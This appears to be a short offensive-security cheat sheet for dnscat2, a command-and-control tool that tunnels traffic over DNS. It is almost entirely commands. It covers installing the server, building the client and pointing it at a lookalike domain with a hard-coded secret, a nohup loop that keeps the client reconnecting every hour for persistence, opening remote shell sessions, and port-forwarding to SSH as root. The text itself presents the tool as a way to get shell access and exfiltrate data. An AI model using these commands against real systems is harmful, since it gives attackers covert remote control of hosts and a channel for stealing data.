https://github.com/iagox86/dnscat2 is a tool designed to create an encrypted C2C channel over DNS

dnscat2 is because it does not require
root privileges and allows both shell access and exfiltration.

Server:

sudo su -
apt-get update
apt-get install ruby-dev
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
apt-get install gcc make
gem install bundler
bundle install
ruby ./dnscat2.rb

ruby ./dnscat2.rb loca1host.com --secret 39dfj3hdsfajh37e8c902j


Client:

git clone https://github.com/iagox86/dnscat2.git /opt/dnscat2/client
cd /opt/dnscat2/client/
make
We should now have a dnscat binary created!
(If in Windows: Load client/win32/dnscat2.vcproj into Visual Studio and hit "build")

./dnscat loca1host.com --secret 39dfj3hdsfajh37e8c902j

nohup /bin/bash -c "while true; do /opt/dnscat2/client/dnscat loca1host.com --secret
39dfj3hdsfajh37e8c902j --max-retransmits 5; sleep 3600; done" > /dev/null 2>&1 &

https://github.com/lukebaggett/dnscat2-powershell.

Server:
window

Interact with our first command sessions
window -i 1
Start a shell sessions
shell
Back out to the main session
Ctrl-z
Interact with the 2 session - sh
window -i 2

Tunnel in dnscat2

listen 127.0.0.1:9999 10.100.100.1:22

ssh root#localhost -p 9999

